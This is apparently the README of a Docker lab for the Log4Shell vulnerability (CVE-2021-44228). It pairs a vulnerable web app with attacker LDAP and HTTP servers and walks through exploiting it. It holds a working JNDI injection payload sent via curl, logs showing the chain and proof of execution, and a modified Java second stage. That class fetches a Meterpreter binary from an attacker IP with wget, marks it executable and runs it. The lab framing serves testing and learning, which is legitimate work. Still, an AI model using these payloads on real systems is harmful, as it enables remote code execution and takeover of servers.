# log4shell-dockerlab

## Credits
All credits goes to the original authors. I just git-cloned and created a docker-compose file, that's all. 

- [LunaSec - log4shell 0-day](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [@christophetd - log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)
- [@mbechler - marshalsec](https://github.com/mbechler/marshalsec)
- [@tangxiaofen7 - Exploit.java](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)

## Description 
This repository contains a docker-compose setup which starts an attacker LDAP server and a victim web server that is vulnerable to log4shell (CVE-2021-44228). 

## Components 

**Victim Web server - log4shell-vulnerable-app:** A web server with log4j, vulnerable to first stage payload, which is the log4shell attack. 

**Attacker LDAP sever - marshalsec:** A LDAP server that receives jndi request from the victim web server. Redirects the victim web server to attacker web server. 

**Attacker Web server:** A `python3 -m http.server` server which hosts the second stage payload, which is the `Exploit.class`. 

## Usage 

Start the victim web server and the attacker ldap server 
```
docker-compose up --build 
```

Prepare the second stage payload. The port 8888 is hardcoded. To change this, modify `./marshalsec/Dockerfile`.
```
cd ./attacker-webserver
python3 -m http.server 8888
```

Attack
```
// Attack with log4shell payload 
└─# curl <your-vm-ip>:8080 -H 'X-Api-Version: ${jndi:ldap://<your-vm-ip>:1389/Exploit}'    

Hello, world!

// Docker-compose's LDAP server replying to JNDI & victim web server downloading Exploit.class from the attacker web server 
log4shell-dockerlab-targetweb-1  |
log4shell-dockerlab-jndi-1       | Send LDAP reference result for Exploit redirecting to http://172.17.0.1:8888/Exploit.class
log4shell-dockerlab-targetweb-1  | 2021-12-12 05:01:44,345 http-nio-8080-exec-7 WARN Error looking up JNDI resource [ldap://192.168.40.128:1389/Exploit]. javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: Exploit cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'Exploit'
log4shell-dockerlab-targetweb-1  |      at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1092)

// Attacker's web server sending second stage payload to the victim web server. This will get executed.
└─# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
172.20.0.3 - - [12/Dec/2021 00:01:44] "GET /Exploit.class HTTP/1.1" 200 -
```

Check the attack poc 
```
// Check docker ps and find out container ID of the "targetweb"
└─# docker ps
CONTAINER ID   IMAGE                           COMMAND                  CREATED             STATUS          PORTS                                       NAMES
1131d694c91a   log4shell-dockerlab_jndi        "/usr/local/bin/mvn-…"   51 minutes ago      Up 51 minutes   0.0.0.0:1389->1389/tcp, :::1389->1389/tcp   log4shell-dockerlab-jndi-1
a2217b3781ad   log4shell-dockerlab_targetweb   "java -jar /app/spri…" 


// Check /tmp and validate the POC have worked 
└─# docker exec a2217b3781ad ls /tmp
hsperfdata_root
log4shell-pwned
```

## Usage - Modified Payload 
Instead of the `Exploit.java` POC, you can modify the payload.

Install JDK if you don't have one 
```
apt install -y default-jdk 
```

Modify the PoC. For example, you can test with a metasploit's `multi/script/web_delivery`. 
```
// Modified PoC to ship meterpreter instead of the original echo pwned > /tmp/log4shell-pwned payload. 

public class Rev {
    public Rev() {}
    static {
        try {
            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c", "calc.exe"}
                    : new String[]{"sh","-c", "wget -qO PqhJT1H2 --no-check-certificate http://192.168.40.128:7777/mhjfufvGzrRws; chmod +x PqhJT1H2; ./PqhJT1H2& disown"};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        Rev e = new Rev();
    }
} 
```

Compile the second stage. Make sure to target JDK 8, since the `log4shell-vulnerable-app` was built on JDK 8. 
```
// Compile with JDK 8
javac --release 8 <your-payload>.java 

// Sanity check and make sure it's version 52.0 (jdk 8)
└─# file Rev.class
Rev.class: compiled Java class data, version 52.0 (Java 1.8)
```

Host the file, and attack again
```
python3 -m http.server 8888 
curl <your-vm-ip>:8080 -H 'X-Api-Version: ${jndi:ldap://<your-vm-ip>:1389/Exploit}'
ex) curl 192.168.40.128:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.40.128:1389/Exploit}'  
```

## References 
https://www.lunasec.io/docs/blog/log4j-zero-day/

http://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228

https://github.com/christophetd/log4shell-vulnerable-app

https://github.com/mbechler/marshalsec

https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
